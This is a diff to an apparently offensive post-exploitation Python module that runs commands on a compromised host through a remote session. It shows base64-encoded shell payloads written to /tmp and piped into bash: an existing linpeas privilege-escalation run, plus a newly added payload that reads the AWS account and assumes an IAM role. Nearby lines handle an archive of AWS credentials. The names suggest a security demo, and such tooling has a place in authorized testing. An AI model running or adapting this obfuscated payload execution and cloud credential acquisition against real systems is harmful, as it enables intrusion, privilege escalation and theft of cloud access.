@@ -46,6 +46,18 @@ class Module(BaseModule):
                 result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'")
                 session.log(result)
 
+                # run a local assume role...not ideal
+                payload = base64.b64encode(b'''
+                ROLE_NAME="rds_user_access_role_ciemdemo"
+                SESSION_NAME="khon.traktour@interlacelabs"
+                AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=$PROFILE $opts | jq -r '.Account')
+                log "Account Number: $AWS_ACCOUNT_NUMBER"
+                CREDS=$(aws sts assume-role --role-arn "arn:aws:iam::$AWS_ACCOUNT_NUMBER:role/$ROLE_NAME" --role-session-name="$SESSION_NAME")
+                ''')
+                session.log("payload loaded and ready")
+                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_assumerole | base64 -d | /bin/bash'")
+                session.log(result)
+
                 # remove any pre-existing cred archived
                 if session.platform.Path('/tmp/aws_creds.tgz').exists():
                     session.platform.unlink('/tmp/aws_creds.tgz')
